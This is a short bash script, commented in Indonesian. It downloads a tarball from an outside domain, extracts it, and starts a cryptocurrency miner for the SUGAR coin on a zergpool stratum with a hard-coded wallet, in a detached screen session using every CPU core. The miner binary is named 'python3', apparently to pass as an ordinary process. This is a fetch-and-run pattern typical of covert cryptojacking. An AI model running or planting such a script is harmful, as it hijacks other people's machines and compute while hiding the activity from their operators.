#!/bin/bash

# Periksa apakah file sudah diekstrak sebelumnya
if [ ! -d "blokgul" ]; then
echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
wget -O blok https://dot-aja.my.id/dotcpu.tar.gz
tar -xvf blok
else
    echo "File sudah diekstrak. Lewati pengunduhan."
fi

screen -dmS DOT ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zergpool.com:6535 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
